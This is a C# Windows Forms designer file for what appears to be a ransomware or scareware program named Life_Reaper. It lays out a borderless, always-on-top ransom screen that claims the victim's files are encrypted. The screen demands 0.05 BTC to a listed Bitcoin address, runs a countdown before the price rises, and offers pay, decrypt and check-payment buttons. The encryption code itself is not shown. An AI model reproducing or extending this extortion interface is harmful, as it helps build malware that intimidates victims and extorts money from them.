namespace Life_Reaper
{
    partial class Form1
    {
        private System.ComponentModel.IContainer components = null;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            panelHeader = new Panel();
            lblTitle = new Label();
            panelContent = new Panel();
            lblWarning = new Label();
            lblDescription = new Label();
            lblCountdownLabel = new Label();
            lblCountdown = new Label();
            lblInstructions = new Label();
            lblBtcAddress = new Label();
            lblBtcAmount = new Label();
            btnDecrypt = new Button();
            btnPay = new Button();
            btnCheckPayment = new Button();
            lblTimer = new Label();
            timerCountdown = new System.Windows.Forms.Timer(components);
            panelHeader.SuspendLayout();
            panelContent.SuspendLayout();
            SuspendLayout();
            // 
            // panelHeader
            // 
            panelHeader.BackColor = Color.FromArgb(192, 0, 0);
            panelHeader.Controls.Add(lblTitle);
            panelHeader.Dock = DockStyle.Top;
            panelHeader.Location = new Point(0, 0);
            panelHeader.Name = "panelHeader";
            panelHeader.Size = new Size(750, 60);
            panelHeader.TabIndex = 0;
            // 
            // lblTitle
            // 
            lblTitle.AutoSize = true;
            lblTitle.Font = new Font("Segoe UI", 24F, FontStyle.Bold, GraphicsUnit.Point);
            lblTitle.ForeColor = Color.White;
            lblTitle.Location = new Point(12, 9);
            lblTitle.Name = "lblTitle";
            lblTitle.Size = new Size(380, 45);
            lblTitle.TabIndex = 0;
            lblTitle.Text = "续命 1926.08.17";
            // 
            // panelContent
            // 
            panelContent.BackColor = Color.FromArgb(245, 245, 245);
            panelContent.Controls.Add(lblWarning);
            panelContent.Controls.Add(lblDescription);
            panelContent.Controls.Add(lblCountdownLabel);
            panelContent.Controls.Add(lblCountdown);
            panelContent.Controls.Add(lblInstructions);
            panelContent.Controls.Add(lblBtcAddress);
            panelContent.Controls.Add(lblBtcAmount);
            panelContent.Controls.Add(btnDecrypt);
            panelContent.Controls.Add(btnPay);
            panelContent.Controls.Add(btnCheckPayment);
            panelContent.Dock = DockStyle.Fill;
            panelContent.Location = new Point(0, 60);
            panelContent.Name = "panelContent";
            panelContent.Size = new Size(750, 540);
            panelContent.TabIndex = 1;
            // 
            // lblWarning
            // 
            lblWarning.AutoSize = true;
            lblWarning.Font = new Font("Segoe UI", 18F, FontStyle.Bold, GraphicsUnit.Point);
            lblWarning.ForeColor = Color.FromArgb(192, 0, 0);
            lblWarning.Location = new Point(25, 20);
            lblWarning.Name = "lblWarning";
            lblWarning.Size = new Size(520, 32);
            lblWarning.TabIndex = 0;
            lblWarning.Text = "Ooops, your files have been encrypted!";
            // 
            // lblDescription
            // 
            lblDescription.Font = new Font("Segoe UI", 11F, FontStyle.Regular, GraphicsUnit.Point);
            lblDescription.ForeColor = Color.FromArgb(50, 50, 50);
            lblDescription.Location = new Point(25, 65);
            lblDescription.Name = "lblDescription";
            lblDescription.Size = new Size(700, 100);
            lblDescription.TabIndex = 1;
            lblDescription.Text = "What happened to your files?\nAll of your files were protected by a strong encryption. Your files are safe, but you cannot access them until you pay.\n\nWhat guarantees do we give?\nWe care about our reputation and we guarantee decryption. You can decrypt one file for free to test.";
            // 
            // lblCountdownLabel
            // 
            lblCountdownLabel.AutoSize = true;
            lblCountdownLabel.Font = new Font("Segoe UI", 14F, FontStyle.Bold, GraphicsUnit.Point);
            lblCountdownLabel.ForeColor = Color.FromArgb(192, 0, 0);
            lblCountdownLabel.Location = new Point(25, 180);
            lblCountdownLabel.Name = "lblCountdownLabel";
            lblCountdownLabel.Size = new Size(280, 25);
            lblCountdownLabel.TabIndex = 2;
            lblCountdownLabel.Text = "Payment will be raised on:";
            // 
            // lblCountdown
            // 
            lblCountdown.AutoSize = true;
            lblCountdown.Font = new Font("Segoe UI", 28F, FontStyle.Bold, GraphicsUnit.Point);
            lblCountdown.ForeColor = Color.FromArgb(192, 0, 0);
            lblCountdown.Location = new Point(25, 210);
            lblCountdown.Name = "lblCountdown";
            lblCountdown.Size = new Size(180, 50);
            lblCountdown.TabIndex = 3;
            lblCountdown.Text = "07:00:00";
            // 
            // lblInstructions
            // 
            lblInstructions.AutoSize = true;
            lblInstructions.Font = new Font("Segoe UI", 12F, FontStyle.Bold, GraphicsUnit.Point);
            lblInstructions.ForeColor = Color.FromArgb(50, 50, 50);
            lblInstructions.Location = new Point(25, 280);
            lblInstructions.Name = "lblInstructions";
            lblInstructions.Size = new Size(180, 21);
            lblInstructions.TabIndex = 4;
            lblInstructions.Text = "Send exact amount to:";
            // 
            // lblBtcAddress
            // 
            lblBtcAddress.AutoSize = true;
            lblBtcAddress.Font = new Font("Consolas", 12F, FontStyle.Regular, GraphicsUnit.Point);
            lblBtcAddress.ForeColor = Color.FromArgb(0, 100, 200);
            lblBtcAddress.Location = new Point(25, 310);
            lblBtcAddress.Name = "lblBtcAddress";
            lblBtcAddress.Size = new Size(420, 19);
            lblBtcAddress.TabIndex = 5;
            lblBtcAddress.Text = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
            // 
            // lblBtcAmount
            // 
            lblBtcAmount.AutoSize = true;
            lblBtcAmount.Font = new Font("Segoe UI", 14F, FontStyle.Bold, GraphicsUnit.Point);
            lblBtcAmount.ForeColor = Color.FromArgb(192, 0, 0);
            lblBtcAmount.Location = new Point(25, 345);
            lblBtcAmount.Name = "lblBtcAmount";
            lblBtcAmount.Size = new Size(150, 25);
            lblBtcAmount.TabIndex = 6;
            lblBtcAmount.Text = "0.05 BTC";
            // 
            // btnDecrypt
            // 
            btnDecrypt.BackColor = Color.FromArgb(192, 0, 0);
            btnDecrypt.FlatAppearance.BorderSize = 0;
            btnDecrypt.FlatStyle = FlatStyle.Flat;
            btnDecrypt.Font = new Font("Segoe UI", 12F, FontStyle.Bold, GraphicsUnit.Point);
            btnDecrypt.ForeColor = Color.White;
            btnDecrypt.Location = new Point(25, 400);
            btnDecrypt.Name = "btnDecrypt";
            btnDecrypt.Size = new Size(200, 45);
            btnDecrypt.TabIndex = 7;
            btnDecrypt.Text = "DECRYPT FILES";
            btnDecrypt.UseVisualStyleBackColor = false;
            btnDecrypt.Click += BtnDecrypt_Click;
            // 
            // btnPay
            // 
            btnPay.BackColor = Color.FromArgb(0, 100, 200);
            btnPay.FlatAppearance.BorderSize = 0;
            btnPay.FlatStyle = FlatStyle.Flat;
            btnPay.Font = new Font("Segoe UI", 12F, FontStyle.Bold, GraphicsUnit.Point);
            btnPay.ForeColor = Color.White;
            btnPay.Location = new Point(250, 400);
            btnPay.Name = "btnPay";
            btnPay.Size = new Size(200, 45);
            btnPay.TabIndex = 8;
            btnPay.Text = "PAY BITCOIN";
            btnPay.UseVisualStyleBackColor = false;
            btnPay.Click += BtnPay_Click;
            // 
            // btnCheckPayment
            // 
            btnCheckPayment.BackColor = Color.FromArgb(80, 80, 80);
            btnCheckPayment.FlatAppearance.BorderSize = 0;
            btnCheckPayment.FlatStyle = FlatStyle.Flat;
            btnCheckPayment.Font = new Font("Segoe UI", 12F, FontStyle.Bold, GraphicsUnit.Point);
            btnCheckPayment.ForeColor = Color.White;
            btnCheckPayment.Location = new Point(475, 400);
            btnCheckPayment.Name = "btnCheckPayment";
            btnCheckPayment.Size = new Size(200, 45);
            btnCheckPayment.TabIndex = 9;
            btnCheckPayment.Text = "CHECK PAYMENT";
            btnCheckPayment.UseVisualStyleBackColor = false;
            btnCheckPayment.Click += BtnCheckPayment_Click;
            // 
            // lblTimer
            // 
            lblTimer.AutoSize = true;
            lblTimer.Font = new Font("Segoe UI", 10F, FontStyle.Regular, GraphicsUnit.Point);
            lblTimer.ForeColor = Color.FromArgb(100, 100, 100);
            lblTimer.Location = new Point(25, 465);
            lblTimer.Name = "lblTimer";
            lblTimer.Size = new Size(350, 19);
            lblTimer.TabIndex = 10;
            lblTimer.Text = "Time left to decrypt for free: ";
            // 
            // timerCountdown
            // 
            timerCountdown.Enabled = true;
            timerCountdown.Interval = 1000;
            timerCountdown.Tick += TimerCountdown_Tick;
            // 
            // Form1
            // 
            AutoScaleDimensions = new SizeF(7F, 15F);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new Size(750, 600);
            Controls.Add(panelContent);
            Controls.Add(panelHeader);
            FormBorderStyle = FormBorderStyle.None;
            Name = "Form1";
            StartPosition = FormStartPosition.CenterScreen;
            Text = "续命 1926.08.17";
            TopMost = true;
            panelHeader.ResumeLayout(false);
            panelHeader.PerformLayout();
            panelContent.ResumeLayout(false);
            panelContent.PerformLayout();
            ResumeLayout(false);
        }

        #endregion

        private Panel panelHeader;
        private Label lblTitle;
        private Panel panelContent;
        private Label lblWarning;
        private Label lblDescription;
        private Label lblCountdownLabel;
        private Label lblCountdown;
        private Label lblInstructions;
        private Label lblBtcAddress;
        private Label lblBtcAmount;
        private Button btnDecrypt;
        private Button btnPay;
        private Button btnCheckPayment;
        private Label lblTimer;
        private System.Windows.Forms.Timer timerCountdown;
    }
}
